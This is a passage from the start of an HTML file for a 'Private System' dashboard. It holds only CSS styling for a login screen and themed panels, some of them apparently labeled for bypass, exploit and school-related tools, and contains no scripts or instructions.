<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Private System</title>
  <style>
    /* General styles and resets */
    * {
      box-sizing: border-box;
      font-family: 'Segoe UI', sans-serif;
      transition: all 0.3s ease; /* Smooth transitions for UI changes */
    }

    body {
      margin: 0;
      padding: 0;
      background: #000;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh; /* Use min-height to ensure it fills screen */
      overflow: auto; /* Allow scrolling if content overflows */
      flex-direction: column; /* Stack children vertically */
    }

    /* Initializing Screen */
    #initializationScreen {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: #000;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      z-index: 9999;
      color: white;
    }

    .rotating-cube {
      width: 100px;
      height: 100px;
      position: relative;
      transform-style: preserve-3d;
      animation: rotateCube 4s infinite linear;
      margin-bottom: 20px;
    }

    .cube-face {
      position: absolute;
      width: 100px;
      height: 100px;
      background: rgba(255, 145, 77, 0.7); /* Orange */
      border: 2px solid white;
      opacity: 0.9;
      box-shadow: 0 0 10px rgba(255, 145, 77, 0.7);
    }

    .cube-face.front  { transform: rotateY(0deg) translateZ(50px); }
    .cube-face.back   { transform: rotateX(180deg) translateZ(50px); }
    .cube-face.right  { transform: rotateY(90deg) translateZ(50px); }
    .cube-face.left   { transform: rotateY(-90deg) translateZ(50px); }
    .cube-face.top    { transform: rotateX(90deg) translateZ(50px); }
    .cube-face.bottom { transform: rotateX(-90deg) translateZ(50px); }

    @keyframes rotateCube {
      0%   { transform: rotateX(0deg) rotateY(0deg) rotateZ(0deg); }
      100% { transform: rotateX(360deg) rotateY(360deg) rotateZ(360deg); }
    }

    .init-text {
      font-size: 2em;
      font-family: 'Courier New', monospace;
      font-weight: bold;
      margin-top: 15px;
      background-image: linear-gradient(to right, orange, red);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      animation: gradientShift 2s infinite alternate, pulseText 1.5s infinite alternate;
      min-height: 1.2em; /* To prevent jumping on text change */
      text-align: center;
    }

    @keyframes gradientShift {
      0% { background-position: 0% 50%; }
      100% { background-position: 100% 50%; }
    }

    @keyframes pulseText {
      0% { transform: scale(1); opacity: 0.8; }
      100% { transform: scale(1.05); opacity: 1; }
    }

    .login-fade-in {
        animation: loginFadeIn 1s forwards;
    }
    @keyframes loginFadeIn {
        from { opacity: 0; transform: translateY(20px); }
        to { opacity: 1; transform: translateY(0); }
    }

    /* Dashboard Loading Screen */
    #dashboardLoadingScreen {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: #1a1a1a;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      z-index: 9999;
      color: #f9f2dc;
      display: none; /* Hidden by default */
    }

    .code-box {
      width: 400px;
      min-height: 100px;
      background: #222;
      border: 2px solid #0f0;
      border-radius: 8px;
      padding: 20px;
      margin-top: 30px;
      font-family: 'Courier New', monospace;
      font-size: 1.1em;
      white-space: pre-wrap;
      overflow: hidden;
      position: relative;
      box-shadow: 0 0 20px rgba(0, 255, 0, 0.4);
    }

    .code-text span {
      opacity: 0;
      animation: typeCode 0.1s forwards;
      display: inline-block;
      min-width: 0.6em; /* Ensure spaces take up space for animation */
    }

    @keyframes typeCode {
      to { opacity: 1; }
    }

    /* Alerts */
    .custom-alert {
      position: fixed;
      bottom: 20px;
      right: 20px;
      background-color: #333;
      color: white;
      padding: 15px 25px;
      border-radius: 8px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
      opacity: 0;
      visibility: hidden;
      transform: translateY(20px);
      transition: opacity 0.3s ease, transform 0.3s ease, visibility 0.3s;
      z-index: 10000;
      display: flex;
      align-items: center;
      gap: 10px;
    }
    .custom-alert.show {
      opacity: 1;
      visibility: visible;
      transform: translateY(0);
    }
    .custom-alert-icon {
        font-size: 1.5em;
    }
    .notification-alert {
      position: fixed;
      top: 20px;
      right: 20px;
      background-color: #ff914d;
      color: black;
      padding: 15px 25px;
      border-radius: 8px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
      opacity: 0;
      visibility: hidden;
      transform: translateX(20px);
      transition: opacity 0.5s ease-out, transform 0.5s ease-out, visibility 0.5s;
      z-index: 10001;
      font-weight: bold;
    }
    .notification-alert.show {
      opacity: 1;
      visibility: visible;
      transform: translateX(0);
    }
    .notification-alert.hide {
      opacity: 0;
      visibility: hidden;
      transform: translateX(20px);
    }

    /* Login System Styles */
    .login-wrapper {
        display: flex;
        flex-direction: column;
        align-items: center;
        gap: 20px;
        opacity: 0; /* Hidden initially, fade in after init */
        margin-top: 50px; /* Add space for the login quick bar */
    }

    .login-quick-bar {
        position: fixed;
        top: 20px;
        left: 50%;
        transform: translateX(-50%);
        display: flex;
        gap: 10px;
        background-color: #1a1a1a;
        padding: 10px 20px;
        border-radius: 12px;
        box-shadow: 0 0 10px rgba(255, 145, 77, 0.5);
        z-index: 10;
        opacity: 0; /* Hidden initially */
    }
    .login-quick-bar button {
        background-color: #ff914d;
        border: none;
        padding: 8px 12px;
        border-radius: 6px;
        color: black;
        font-weight: bold;
        cursor: pointer;
        transition: background 0.2s, transform 0.1s;
    }
    .login-quick-bar button:hover {
        background-color: #ffb67a;
        transform: translateY(-2px);
    }
    .login-quick-bar #panicBtn {
        background: #ff4c4c !important;
        color: white !important;
    }


    .login-box {
      background: #000;
      border-radius: 15px; /* More square with rounded corners */
      border: 3px solid white;
      box-shadow: 0 0 15px white;
      width: 380px; /* Slightly wider */
      padding: 30px 25px;
      text-align: center;
      position: relative;
      transition: border-color 0.3s, box-shadow 0.3s;
    }

    .login-box.flashing {
      animation: flashRed 0.4s ease-in-out 2;
    }

    @keyframes flashRed {
      0%, 100% { border-color: red; box-shadow: 0 0 15px red; }
      50% { border-color: white; box-shadow: 0 0 5px white; }
    }

    .login-box h2 {
      font-size: 1.8em;
      margin-bottom: 25px;
      font-family: 'Courier New', monospace;
    }

    .login-box input {
      width: 100%;
      padding: 14px;
      margin-bottom: 18px;
      background: #1c1c1c;
      border: 1px solid #333;
      color: white;
      border-radius: 8px;
      font-size: 1em;
      outline: none;
    }
    .login-box input:focus {
        border-color: #ff914d;
        box-shadow: 0 0 5px rgba(255, 145, 77, 0.7);
    }

    /* Custom Toggle Switch for Show Password & 24hr Format */
    .toggle-switch-container {
        display: flex;
        align-items: center;
        margin-bottom: 15px;
        gap: 10px;
        justify-content: center; /* Center horizontally */
    }
    .toggle-switch {
        position: relative;
        display: inline-block;
        width: 48px;
        height: 28px;
        border-radius: 14px;
        background-color: #ccc;
        cursor: pointer;
        transition: background-color 0.3s;
    }
    .toggle-switch::after {
        content: '';
        position: absolute;
        top: 2px;
        left: 2px;
        width: 24px;
        height: 24px;
        border-radius: 50%;
        background-color: white;
        transition: transform 0.3s;
    }
    .toggle-switch input[type="checkbox"] {
        display: none;
    }
    .toggle-switch input[type="checkbox"]:checked + .toggle-switch {
        background-color: #4CAF50; /* Green */
    }
    .toggle-switch input[type="checkbox"]:checked + .toggle-switch::after {
        transform: translateX(20px);
    }
    .toggle-switch-label {
        font-size: 0.9em;
        user-select: none;
        cursor: pointer;
        display: flex;
        align-items: center;
    }


    .login-box button {
      width: 100%;
      padding: 12px;
      background-color: red;
      color: white;
      font-size: 1.1em;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      margin-top: 10px;
      transition: background-color 0.2s, transform 0.1s;
    }
    .login-box button:hover {
        background-color: #e00;
        transform: translateY(-2px);
    }
    .login-box button:disabled {
        background-color: #555;
        cursor: not-allowed;
    }

    .attempt-counter, .error-message {
      margin-top: 12px;
      font-size: 0.9em;
      color: red;
      min-height: 1.5em; /* Prevent layout shift */
    }

    .login-time-date-box {
        background: #1a1a1a;
        border-radius: 15px;
        border: 3px solid white;
        box-shadow: 0 0 15px rgba(255, 145, 77, 0.3);
        width: 380px;
        padding: 20px 25px;
        text-align: center;
        color: white;
    }
    .login-time-date-box p {
        margin: 5px 0;
        font-size: 1.1em;
        font-family: 'Courier New', monospace;
    }
    .login-time-date-box .current-time {
        font-size: 1.8em;
        font-weight: bold;
        color: #ff914d;
        margin-bottom: 10px;
    }
    .login-time-date-box .current-date {
        font-size: 1.2em;
        margin-top: 5px;
        margin-bottom: 10px;
    }
    .login-history-btn {
      background-color: #ff914d !important;
      color: black !important;
      padding: 8px 15px !important;
      border-radius: 6px !important;
      margin-top: 15px !important;
      width: auto !important;
    }


    .popup {
      display: none;
      position: absolute;
      top: 50%;
      left: 50%;
      width: 320px;
      padding: 20px;
      transform: translate(-50%, -50%);
      background: black;
      border: 3px solid white;
      border-radius: 15px;
      box-shadow: 0 0 20px white;
      z-index: 10;
    }

    .popup input {
      margin-bottom: 15px;
    }

    /* Dashboard Styles */
    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap');

    body.dashboard-body {
      font-family: 'Montserrat', sans-serif;
      background-color: #1a1a1a;
      color: #f9f2dc;
      padding: 20px;
      transition: background-color 0.3s, color 0.3s;
      zoom: 1;
      display: block; /* Override login-body flex */
    }

    body.dashboard-body.light-theme {
      background-color: #f9f2dc;
      color: #1a1a1a;
    }
    body.dashboard-body.blue-theme {
      background-color: #0d1a2f;
      color: #e0f2f7;
    }
    body.dashboard-body.green-theme {
      background-color: #0f210f;
      color: #e6ffe6;
    }

    .dashboard-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      background: #ff914d;
      padding: 15px 25px;
      border-radius: 12px;
      color: #000;
      margin-bottom: 20px;
      transition: background 0.3s, color 0.3s, box-shadow 0.3s;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
    }
    body.dashboard-body.light-theme .dashboard-header { background: #ffd966; }
    body.dashboard-body.blue-theme .dashboard-header { background: #3498db; color: white; }
    body.dashboard-body.green-theme .dashboard-header { background: #27ae60; color: white; }

    .dashboard-header h1 {
      font-size: 24px;
      margin: 0;
    }

    .user-info {
      font-weight: bold;
      font-size: 14px;
    }

    .version-box {
      background: #ffd966;
      padding: 8px 15px;
      border-radius: 8px;
      color: #000;
      font-weight: bold;
      transition: background 0.3s, color 0.3s;
    }
    body.dashboard-body.light-theme .version-box { background: #ccc; }
    body.dashboard-body.blue-theme .version-box { background: #85c1e9; color: #0d1a2f; }
    body.dashboard-body.green-theme .version-box { background: #a2d9ab; color: #0f210f; }

    .quick-bar {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin-bottom: 20px; /* Increased margin */
      flex-wrap: wrap;
      background-color: #2a2a2a;
      padding: 15px 20px;
      border-radius: 12px;
      box-shadow: 0 0 10px rgba(255, 145, 77, 0.3);
    }
    body.dashboard-body.light-theme .quick-bar { background-color: #eee; }
    body.dashboard-body.blue-theme .quick-bar { background-color: #1c3150; }
    body.dashboard-body.green-theme .quick-bar { background-color: #1c3b1c; }


    .quick-bar button {
      background-color: #ff914d;
      border: none;
      padding: 10px 14px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s, transform 0.1s;
      min-width: 110px;
      white-space: nowrap;
    }
    .quick-bar button:hover {
      background-color: #ffb67a;
      transform: translateY(-2px);
    }
    .quick-bar button:active {
        transform: translateY(0);
    }

    #panicBtn {
      background: #ff4c4c !important;
      color: white !important;
    }
    body.dashboard-body.blue-theme #panicBtn { background: #e74c3c !important; }
    body.dashboard-body.green-theme #panicBtn { background: #c0392b !important; }

    .announcement-bar {
      width: 100%;
      background-color: #ff914d;
      color: black;
      font-weight: bold;
      padding: 10px 0;
      overflow: hidden;
      position: relative;
      border-radius: 8px;
      box-sizing: border-box;
      margin-bottom: 20px;
      user-select: none;
      height: 30px;
      line-height: 13px;
    }

    .announcement-bar span {
      display: inline-block;
      white-space: nowrap;
      position: absolute;
      will-change: transform;
      animation: scrollLeft 15s linear infinite;
      padding-left: 100%;
    }

    @keyframes scrollLeft {
      0% {
        transform: translateX(0%);
      }
      100% {
        transform: translateX(-100%);
      }
    }

    body.dashboard-body.light-theme .announcement-bar { background-color: #ffd966; color: #000; }
    body.dashboard-body.blue-theme .announcement-bar { background-color: #85c1e9; color: #0d1a2f; }
    body.dashboard-body.green-theme .announcement-bar { background-color: #a2d9ab; color: #0f210f; }


    /* Panel layout and styling */
    #dashboardLayoutContainer {
        position: relative;
        min-height: 800px; /* Or a suitable height for content */
        margin-top: 20px;
    }

    .box, .info-panel {
      background-color: #2a2a2a;
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 0 15px rgba(255, 145, 77, 0.3);
      transition: background-color 0.3s, color 0.3s;
      min-height: 120px; /* Default min-height */
      /* Make elements draggable/resizable */
      position: absolute; /* Crucial for absolute positioning with drag/resize */
      cursor: grab;
      resize: both; /* Allow resizing horizontally and vertically */
      overflow: auto; /* Show scrollbars if content overflows after resize */
    }

    .box:hover, .info-panel:hover {
      box-shadow: 0 0 20px rgba(255, 145, 77, 0.5); /* Enhanced hover effect */
      z-index: 2; /* Bring active panel to front */
    }
    .box.highlight, .info-panel.highlight {
      animation: highlightPulse 0.8s 3 ease-in-out;
    }
    @keyframes highlightPulse {
      0% { box-shadow: 0 0 20px 5px #00FFFF; transform: scale(1.01); }
      50% { box-shadow: 0 0 10px 2px rgba(255, 145, 77, 0.3); transform: scale(1); }
      100% { box-shadow: 0 0 20px 5px #00FFFF; transform: scale(1.01); }
    }


    body.dashboard-body.light-theme .box,
    body.dashboard-body.light-theme .info-panel {
      background-color: #ffd966;
      color: #000;
      box-shadow: 0 0 15px rgba(255, 145, 77, 0.6);
    }
    body.dashboard-body.blue-theme .box,
    body.dashboard-body.blue-theme .info-panel {
      background-color: #1c3150;
      color: #e0f2f7;
      box-shadow: 0 0 15px rgba(52, 152, 219, 0.6);
    }
    body.dashboard-body.green-theme .box,
    body.dashboard-body.green-theme .info-panel {
      background-color: #1c3b1c;
      color: #e6ffe6;
      box-shadow: 0 0 15px rgba(39, 174, 96, 0.6);
    }

    .box h2, .info-panel h2 {
      font-size: 18px;
      margin-bottom: 10px;
      color: #ffbf80;
    }
    body.dashboard-body.light-theme .box h2,
    body.dashboard-body.light-theme .info-panel h2 { color: #994d00; }
    body.dashboard-body.blue-theme .box h2,
    body.dashboard-body.blue-theme .info-panel h2 { color: #85c1e9; }
    body.dashboard-body.green-theme .box h2,
    body.dashboard-body.green-theme .info-panel h2 { color: #a2d9ab; }

    .box p, .box ul,
    .info-panel p, .info-panel ul {
      font-size: 14px;
    }

    .update-entry {
      background: #40210f;
      padding: 8px;
      margin-top: 5px;
      border-radius: 6px;
      color: #ffccb3;
    }
    body.dashboard-body.light-theme .update-entry { background: #ffd999; color: #994d00; }
    body.dashboard-body.blue-theme .update-entry { background: #29517e; color: #c4e4f7; }
    body.dashboard-body.green-theme .update-entry { background: #2f5a2f; color: #cce0cc; }


    .calendar {
      display: grid;
      grid-template-columns: repeat(7, 1fr);
      gap: 5px;
      margin-top: 10px;
      text-align: center;
      font-size: 12px;
    }
    .calendar div {
      padding: 6px;
      background: #333;
      border-radius: 4px;
    }
    .today {
      background: #ff914d !important;
      font-weight: bold;
      color: black;
    }
    body.dashboard-body.light-theme .calendar div { background: #ffd966; color: #000; }
    body.dashboard-body.light-theme .today { background: #994d00 !important; color: #ffd966; }
    body.dashboard-body.blue-theme .calendar div { background: #264366; color: #e0f2f7; }
    body.dashboard-body.blue-theme .today { background: #3498db !important; color: white; }
    body.dashboard-body.green-theme .calendar div { background: #2c4a2c; color: #e6ffe6; }
    body.dashboard-body.green-theme .today { background: #27ae60 !important; color: white; }


    #canvasContainer {
      display: none; /* Controlled by JS for positioning */
      text-align: center;
      padding-top: 10px;
      width: fit-content;
    }

    #notesCanvas {
      border: 2px solid #ff914d;
      border-radius: 12px;
      background: #fff;
      cursor: crosshair;
      touch-action: none;
      box-shadow: 0 0 10px rgba(255, 145, 77, 0.5);
    }
    #canvasControls {
      margin-top: 10px;
      display: flex;
      flex-wrap: wrap;
      gap: 10px;
      justify-content: center;
    }
    #canvasControls button,
    #canvasControls input[type="range"],
    #canvasControls input[type="color"],
    #canvasControls input[type="text"] {
      background-color: #ff914d;
      border: none;
      padding: 8px 16px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s, transform 0.1s;
    }
    #canvasControls button:hover {
      background-color: #ffb67a;
      transform: translateY(-2px);
    }
    #canvasControls input[type="range"] {
      padding: 5px;
      background: #333;
      color: white;
      min-width: 120px;
      accent-color: #ff914d; /* For the slider thumb */
      box-shadow: none;
      border: none;
    }
    #canvasControls input[type="color"] {
        width: 40px;
        height: 34px; /* Adjust height to match button padding */
        padding: 2px;
        border: none;
        box-shadow: none;
    }
    #canvasControls input[type="text"] {
        color: white;
        padding: 8px;
        font-weight: normal;
        flex-grow: 1;
        min-width: 150px;
    }
    #longTextNotes {
      width: 100%;
      min-height: 80px;
      padding: 10px;
      margin-top: 15px;
      background: #1c1c1c;
      border: 1px solid #333;
      border-radius: 8px;
      color: white;
      resize: vertical;
    }


    .motivation-box, .random-facts-box, .daily-quotes-box {
      background-color: #333;
      color: #ffd966;
      padding: 20px;
      border-radius: 12px;
      font-style: italic;
      font-size: 16px;
      box-shadow: 0 0 12px rgba(255, 145, 77, 0.5);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 120px;
      text-align: center;
    }
    .motivation-box button, .random-facts-box button, .daily-quotes-box button {
      margin-top: 10px;
      background-color: #ff914d;
      border: none;
      padding: 6px 12px;
      border-radius: 6px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s, transform 0.1s;
    }
    .motivation-box button:hover, .random-facts-box button:hover, .daily-quotes-box button:hover {
        background-color: #ffb67a;
        transform: translateY(-2px);
    }

    body.dashboard-body.light-theme .motivation-box,
    body.dashboard-body.light-theme .random-facts-box,
    body.dashboard-body.light-theme .daily-quotes-box {
      background-color: #fff3cc;
      color: #994d00;
      box-shadow: 0 0 12px rgba(255, 145, 77, 0.8);
    }
    body.dashboard-body.blue-theme .motivation-box,
    body.dashboard-body.blue-theme .random-facts-box,
    body.dashboard-body.blue-theme .daily-quotes-box {
      background-color: #29517e;
      color: #85c1e9;
      box-shadow: 0 0 12px rgba(52, 152, 219, 0.8);
    }
    body.dashboard-body.green-theme .motivation-box,
    body.dashboard-body.green-theme .random-facts-box,
    body.dashboard-body.green-theme .daily-quotes-box {
      background-color: #2f5a2f;
      color: #a2d9ab;
      box-shadow: 0 0 12px rgba(39, 174, 96, 0.8);
    }


    /* Info Panel Styles */
    .info-panel {
      display: none;
    }
    .info-panel .links-list {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
        gap: 10px;
        margin-top: 15px;
    }
    .info-panel a {
      display: block;
      background-color: #ff914d;
      border: none;
      padding: 12px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
      text-decoration: none;
      text-align: center;
    }
    .info-panel a:hover {
      background-color: #ffb67a;
    }

    .wifi-grid, .wifi-entry {
      display: grid;
      grid-template-columns: repeat(8, 1fr);
      gap: 10px;
    }
    .wifi-grid { margin-bottom: 15px; }
    .wifi-entry { margin-bottom: 10px; }
    .wifi-grid div {
      padding: 8px;
      background: #333;
      border-radius: 6px;
      text-align: center;
      font-weight: bold;
    }
    .wifi-entry div {
      padding: 8px;
      background: #40210f;
      border-radius: 6px;
      text-align: center;
    }
    .wifi-entry .wifi-level-High { background-color: #28a745; /* Green */ }
    .wifi-entry .wifi-level-Medium { background-color: #ffc107; /* Yellow */ }
    .wifi-entry .wifi-level-Low { background-color: #dc3545; /* Red */ }


    .ipad-options, .bypass-buttons, .handbook-buttons {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
      gap: 10px;
      margin-top: 15px;
    }
    .ipad-options button, .bypass-buttons button {
      background-color: #ff914d;
      border: none;
      padding: 12px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s, transform 0.1s;
    }
    .ipad-options button:hover, .bypass-buttons button:hover {
        background-color: #ffb67a;
        transform: translateY(-2px);
    }
    .ipad-content, .bypass-content, .coming-soon, .info-text {
      display: none; /* Controlled by JS for display */
      background: #40210f;
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
    }

    .exploit-buttons {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
      gap: 10px;
      margin-top: 15px;
    }

    .school-info-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 10px;
      margin-top: 15px;
    }
    .school-info-item {
      background: #40210f;
      padding: 12px;
      border-radius: 8px;
    }

    body.dashboard-body.light-theme .wifi-grid div,
    body.dashboard-body.light-theme .wifi-entry div,
    body.dashboard-body.light-theme .coming-soon,
    body.dashboard-body.light-theme .info-text,
    body.dashboard-body.light-theme .school-info-item,
    body.dashboard-body.light-theme .ipad-content,
    body.dashboard-body.light-theme .bypass-content {
      background: #ffd999;
    }
    body.dashboard-body.blue-theme .wifi-grid div,
    body.dashboard-body.blue-theme .wifi-entry div,
    body.dashboard-body.blue-theme .coming-soon,
    body.dashboard-body.blue-theme .info-text,
    body.dashboard-body.blue-theme .school-info-item,
    body.dashboard-body.blue-theme .ipad-content,
    body.dashboard-body.blue-theme .bypass-content {
      background: #29517e;
    }
    body.dashboard-body.green-theme .wifi-grid div,
    body.dashboard-body.green-theme .wifi-entry div,
    body.dashboard-body.green-theme .coming-soon,
    body.dashboard-body.green-theme .info-text,
    body.dashboard-body.green-theme .school-info-item,
    body.dashboard-body.green-theme .ipad-content,
    body.dashboard-body.green-theme .bypass-content {
      background: #2f5a2f;
    }

    /* Common themed link/button styling */
    body.dashboard-body.blue-theme .info-panel a,
    body.dashboard-body.blue-theme .ipad-options button,
    body.dashboard-body.blue-theme .bypass-buttons button,
    body.dashboard-body.blue-theme .handbook-buttons a,
    body.dashboard-body.blue-theme .exploit-buttons a {
        background-color: #3498db;
        color: white;
    }
    body.dashboard-body.blue-theme .info-panel a:hover,
    body.dashboard-body.blue-theme .ipad-options button:hover,
    body.dashboard-body.blue-theme .bypass-buttons button:hover,
    body.dashboard-body.blue-theme .handbook-buttons a:hover,
    body.dashboard-body.blue-theme .exploit-buttons a:hover {
        background-color: #5dade2;
    }
    body.dashboard-body.green-theme .info-panel a,
    body.dashboard-body.green-theme .ipad-options button,
    body.dashboard-body.green-theme .bypass-buttons button,
    body.dashboard-body.green-theme .handbook-buttons a,
    body.dashboard-body.green-theme .exploit-buttons a {
        background-color: #27ae60;
        color: white;
    }
    body.dashboard-body.green-theme .info-panel a:hover,
    body.dashboard-body.green-theme .ipad-options button:hover,
    body.dashboard-body.green-theme .bypass-buttons button:hover,
    body.dashboard-body.green-theme .handbook-buttons a:hover,
    body.dashboard-body.green-theme .exploit-buttons a:hover {
        background-color: #2ecc71;
    }


    /* Search bar in Quick Bar */
    .quick-bar #dashboardSearchBar {
      flex-grow: 1;
      max-width: 300px;
      background: #1c1c1c;
      border: 1px solid #333;
      color: white;
      padding: 10px;
      border-radius: 8px;
      font-size: 1em;
      outline: none;
      box-shadow: none;
    }
    .quick-bar #dashboardSearchBar:focus {
        border-color: #ff914d;
        box-shadow: 0 0 5px rgba(255, 145, 77, 0.7);
    }
    body.dashboard-body.light-theme .quick-bar #dashboardSearchBar { background: #fff; color: #000; }
    body.dashboard-body.blue-theme .quick-bar #dashboardSearchBar { background: #0f213a; border-color: #3498db; }
    body.dashboard-body.green-theme .quick-bar #dashboardSearchBar { background: #0f210f; border-color: #27ae60; }


    /* Theme dropdown */
    #themeSelector {
        background-color: #ff914d;
        border: none;
        padding: 8px 12px;
        border-radius: 8px;
        color: black;
        font-weight: bold;
        cursor: pointer;
        min-width: 120px;
    }
    #themeSelector:hover {
        background-color: #ffb67a;
        transform: translateY(-2px);
    }
    body.dashboard-body.blue-theme #themeSelector { background-color: #3498db; color: white; }
    body.dashboard-body.blue-theme #themeSelector:hover { background-color: #5dade2; }
    body.dashboard-body.green-theme #themeSelector { background-color: #27ae60; color: white; }
    body.dashboard-body.green-theme #themeSelector:hover { background-color: #2ecc71; }


    /* Settings Panel Specific Styles */
    #settingsPanel {
      display: none;
      flex-direction: column;
      gap: 15px;
      width: fit-content;
      min-width: 400px;
      padding-top: 20px;
    }
    #settingsPanel .setting-item {
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 10px;
        background: #40210f;
        border-radius: 8px;
    }
    #settingsPanel .setting-item label {
        font-weight: bold;
        flex-grow: 1;
        text-align: left;
    }
    #settingsPanel .setting-item input[type="range"],
    #settingsPanel .setting-item select {
        min-width: 120px;
        padding: 5px;
        border-radius: 4px;
        border: 1px solid #333;
        background: #1c1c1c;
        color: white;
        margin-left: 10px;
    }
    body.dashboard-body.light-theme #settingsPanel .setting-item { background: #ffd999; }
    body.dashboard-body.light-theme #settingsPanel .setting-item input,
    body.dashboard-body.light-theme #settingsPanel .setting-item select { background: #eee; color: #000; }


    /* Keybinds Panel Styles */
    #keybindsPanel {
        display: none;
        flex-direction: column;
        gap: 15px;
        width: fit-content;
        min-width: 500px;
        padding-top: 20px;
    }
    #keybindsPanel .keybind-item {
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 10px;
        background: #40210f;
        border-radius: 8px;
    }
    #keybindsPanel .keybind-item span {
        flex-grow: 1;
        text-align: left;
    }
    #keybindsPanel .keybind-config {
        display: flex;
        gap: 10px;
        align-items: center;
    }
    #keybindInput {
        padding: 8px;
        border-radius: 4px;
        border: 1px solid #333;
        background: #1c1c1c;
        color: white;
    }
    #keybindAction {
        padding: 8px;
        border-radius: 4px;
        border: 1px solid #333;
        background: #1c1c1c;
        color: white;
    }
    #keybindAddBtn {
        background-color: #28a745; /* Green for add */
        color: white;
        border: none;
        padding: 8px 12px;
        border-radius: 6px;
        cursor: pointer;
    }
    #keybindAddBtn:hover { background-color: #218838; }

    /* Timer Tool Panel Styles */
    #timerToolPanel {
        display: none;
        flex-direction: column;
        gap: 20px;
        width: fit-content;
        min-width: 350px;
        padding-top: 20px;
    }
    #timerToolPanel h3 {
        color: #ff914d;
        margin-top: 0;
        margin-bottom: 10px;
        text-align: left;
        width: 100%;
    }
    #timerToolPanel .tool-section {
        background: #40210f;
        padding: 15px;
        border-radius: 8px;
        display: flex;
        flex-direction: column;
        gap: 10px;
        align-items: flex-start; /* Align contents to the left */
    }
    #timerToolPanel .timer-display,
    #timerToolPanel .stopwatch-display {
        font-size: 2em;
        font-weight: bold;
        color: #ffd966;
        width: 100%;
        text-align: center;
        margin-bottom: 10px;
    }
    #timerToolPanel .timer-inputs {
        display: flex;
        gap: 5px;
        width: 100%;
        justify-content: center;
        margin-bottom: 10px;
    }
    #timerToolPanel .timer-inputs input {
        width: 70px;
        padding: 8px;
        border-radius: 4px;
        border: 1px solid #333;
        background: #1c1c1c;
        color: white;
        text-align: center;
    }
    #timerToolPanel .tool-controls {
        display: flex;
        gap: 10px;
        justify-content: center;
        width: 100%;
    }
    #timerToolPanel .tool-controls button {
        background-color: #ff914d;
        color: black;
        border: none;
        padding: 8px 12px;
        border-radius: 6px;
        cursor: pointer;
    }
    #timerToolPanel .tool-controls button:hover {
        background-color: #ffb67a;
    }

    #timerToolPanel .reminder-input {
      width: 100%;
      padding: 8px;
      border-radius: 4px;
      border: 1px solid #333;
      background: #1c1c1c;
      color: white;
    }
    #reminderTime {
        padding: 5px;
        margin-top: 5px;
    }


    /* Activity Log Panel */
    #activityLogPanel {
        display: none;
        width: fit-content;
        min-width: 600px;
        min-height: 400px;
    }
    #activityLogList {
        max-height: 350px;
        overflow-y: auto;
        border: 1px solid #444;
        padding: 10px;
        border-radius: 8px;
        margin-top: 15px;
        background: #1c1c1c;
    }
    #activityLogList p {
        margin: 5px 0;
        font-size: 0.9em;
        color: #ccc;
    }
    #activityLogList p strong {
        color: #ff914d;
    }

    /* Login History Panel */
    #loginHistoryPanel {
        display: none;
        width: fit-content;
        min-width: 500px;
        min-height: 300px;
    }
    #loginHistoryPanel p {
        margin-bottom: 10px;
        font-size: 1.1em;
        color: #ff914d;
    }
    #loginHistoryList {
        max-height: 250px;
        overflow-y: auto;
        border: 1px solid #444;
        padding: 10px;
        border-radius: 8px;
        background: #1c1c1c;
        margin-top: 15px;
    }
    #loginHistoryList div {
        margin-bottom: 5px;
        padding-bottom: 5px;
        border-bottom: 1px dashed #333;
        font-size: 0.9em;
    }
    #loginHistoryList div:last-child {
        border-bottom: none;
    }
    .login-success { color: #28a745; }
    .login-fail { color: #dc3545; }
    .login-reset { color: #ffc107; }

    /* Calculator Panel */
    #calculatorPanel {
      display: none;
      width: fit-content;
      min-width: 300px;
      max-width: 300px;
    }
    .calculator-grid {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 10px;
      margin-top: 15px;
    }
    #calculatorDisplay {
      grid-column: span 4;
      background-color: #1c1c1c;
      color: white;
      font-size: 2em;
      text-align: right;
      padding: 15px;
      border-radius: 8px;
      margin-bottom: 10px;
    }
    #calculatorPanel button {
      background-color: #555;
      color: white;
      border: none;
      padding: 15px;
      border-radius: 8px;
      font-size: 1.2em;
      cursor: pointer;
    }
    #calculatorPanel button:hover { background-color: #777; }
    #calculatorPanel .operator { background-color: #ff914d; }
    #calculatorPanel .operator:hover { background-color: #ffb67a; }
    #calculatorPanel .clear { background-color: #dc3545; }
    #calculatorPanel .clear:hover { background-color: #c82333; }
    #calculatorPanel .equals { background-color: #28a745; grid-column: span 2;}
    #calculatorPanel .equals:hover { background-color: #218838; }

    /* Unit Converter Panel */
    #unitConverterPanel {
      display: none;
      width: fit-content;
